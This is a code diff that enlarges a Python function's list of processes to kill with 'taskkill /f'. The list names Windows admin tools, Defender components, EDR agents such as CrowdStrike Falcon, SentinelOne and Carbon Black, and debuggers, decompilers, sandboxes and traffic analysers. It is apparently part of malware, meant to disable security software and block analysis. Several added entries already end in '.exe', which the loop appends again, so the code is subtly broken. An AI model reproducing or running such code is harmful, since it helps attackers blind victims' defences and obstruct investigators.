@@ -327,17 +327,27 @@ def block_processes():
         "cmd", "powershell", "regedit", "taskmgr", "explorer",
         "netstat", "msconfig", "perfmon", "tasklist", "services",
         "sysmon", "eventvwr", "wmic", "schtasks", "SecurityHealthSystray",
-        "MpCmdRun", "MsMpEng", "smartscreen",
-        "ProcessHacker", "procexp", "procexp64", "tcpview", "wireshark",
-        "autoruns", "autorunsc", "filemon", "regmon", "sandboxie", "ollydbg",
-        "x32dbg", "x64dbg", "ida64", "ida", "windbg", "Dbgview", "frida",
-        "hookexplorer", "gmer", "cain", "fiddler", "procmon", "regripper",
-        "netmon", "WMIADAP",
-        "SbieCtrl", "SbieSvc", "mbam", "mbamtray", "mbae", "mbaeservice",
-        "cyserver", "cytray", "cb", "carbonblack", "SentinelAgent",
-        "SentinelUI", "SentinelHelperService", "esensor", "csfalconcontainer",
-        "csfalconservice", "csfalcon", "sxutil"
+        "MpCmdRun", "MsMpEng", "smartscreen", "ProcessHacker",
+        "procexp", "procexp64", "tcpview", "wireshark", "autoruns",
+        "autorunsc", "filemon", "regmon", "sandboxie", "ollydbg",
+        "x32dbg", "x64dbg", "ida64", "ida", "windbg", "Dbgview",
+        "frida", "hookexplorer", "gmer", "cain", "fiddler", "procmon",
+        "regripper", "netmon", "WMIADAP", "SbieCtrl", "SbieSvc",
+        "mbam", "mbamtray", "mbae", "mbaeservice", "cyserver",
+        "cytray", "cb", "carbonblack", "SentinelAgent", "SentinelUI",
+        "SentinelHelperService", "esensor", "csfalconcontainer",
+        "csfalconservice", "csfalcon", "sxutil", "taskmgr.exe",
+        "process.exe", "processhacker.exe", "ksdumper.exe",
+        "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe",
+        "httpanalyzerv7.exe", "decoder.exe", "regedit.exe",
+        "procexp.exe", "dnspy.exe", "vboxservice.exe",
+        "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe",
+        "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "gdb.exe",
+        "idaq.exe", "idag.exe", "idaw.exe", "ida64.exe",
+        "idag64.exe", "idaw64.exe", "idaq64.exe", "windbg.exe",
+        "immunitydebugger.exe", "windasm.exe"
     ]
+
     
     for proc in blocked_processes:
         execute_command(f"taskkill /f /im \"{proc}.exe\"")
